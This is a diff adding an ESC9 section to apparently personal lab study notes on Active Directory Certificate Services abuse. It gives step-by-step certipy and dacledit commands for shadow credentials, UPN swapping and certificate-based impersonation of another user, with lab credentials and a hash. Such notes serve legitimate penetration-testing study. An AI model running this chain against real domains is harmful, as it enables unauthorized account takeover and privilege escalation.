@@ -94,3 +94,63 @@ certipy req -u 'blwasp@lab.local' -p 'Password123!' -ca 'lab-LAB-DC-CA' -templat
 certipy req -u 'blwasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -template 'User' -on-behalf-of 'lab\administrator' -pfx blwasp.pfx
 ```
 %% request cert on behalf of administrator account%%
+
+## ESC9
+A key aspect to grasp is that if the msPKI-Enrollment-Flag attribute of a certificate template contains the CT_FLAG_NO_SECURITY_EXTENSION flag, it effectively negates the embedding of the szOID_NTDS_CA_SECURITY_EXT security extension. This means that irrespective of the configuration of the StrongCertificateBindingEnforcement registry key (even if set to its default value of 1), the mapping process will occur as if the registry key had a value of 0, essentially bypassing strong certificate mapping.
+
+Consequently, this loophole can be exploited if we possess sufficient privileges to access and modify a user account's User Principal Name (UPN), aligning it with the UPN of another account. By leveraging this manipulated configuration, we can request a certificate for the user using their legitimate credentials. Remarkably, the obtained certificate will be seamlessly mapped to the other account, which is the ultimate target.
+
+## ESC9 Abuse Requirements
+To successfully abuse this misconfiguration, specific prerequisites must be met:
+
+1. The StrongCertificateBindingEnforcement registry key should not be set to 2 (by default, it is set to 1), or the CertificateMappingMethods should contain the UPN flag (0x4). Regrettably, as a low-privileged user, accessing and reading the values of these registry keys is typically unattainable.
+
+2. The certificate template must incorporate the CT_FLAG_NO_SECURITY_EXTENSION flag within the msPKI-Enrollment-Flag value.
+
+3. The certificate template should explicitly specify client authentication as its purpose.
+
+4. The attacker must possess at least the GenericWrite privilege against any user account (account A) to compromise the security of any other user account (account B).
+
+```
+certipy find -u 'blwasp@lab.local' -p 'Password123!' -dc-ip 10.129.205.199 -vulnerable -stdout
+```
+%% identify vulnerable templates %%
+
+```
+git clone https://github.com/ShutdownRepo/impacket -b dacledit
+cd impacket
+python3 -m venv .dacledit
+source .dacledit/bin/activate
+python3 -m pip install .
+```
+%% install dacledit which confirms if we have full control rights over the account whose certificate we want to request. This attack is only possible if we have full control rights over the account we are targeting%%
+
+```
+dacledit.py -action read -dc-ip 10.129.205.199 lab.local/blwasp:Password123! -principal blwasp -target user2
+```
+%% Using DACLEDIT to enumerate user rights%%
+
+```
+certipy shadow auto -u 'BlWasp@lab.local' -p 'Password123!' -account user2
+```
+%%Retrieve user2 NT Hash via Shadow Credentials %%
+
+```
+certipy account update -u 'BlWasp@lab.local' -p 'Password123!' -user user2 -upn user3@lab.local
+```
+%%Change user2(user we have full control over) UPN to user3(target user)%%
+
+```
+certipy req -u 'user2@lab.local' -hashes 2b576acbe6bcfda7294d6bd18041b8fe -ca lab-LAB-DC-CA -template ESC9
+```
+%%Request vulnerable certipy with user2%%
+
+```
+certipy account update -u 'BlWasp@lab.local' -p 'Password123!' -user user2 -upn user2@lab.local
+```
+%%revert changes of user2 by changing user2 back to original UPN%%
+
+```
+certipy auth -pfx user3.pfx -domain lab.local
+```
+%%authenticate as user3 with the previous cert%%
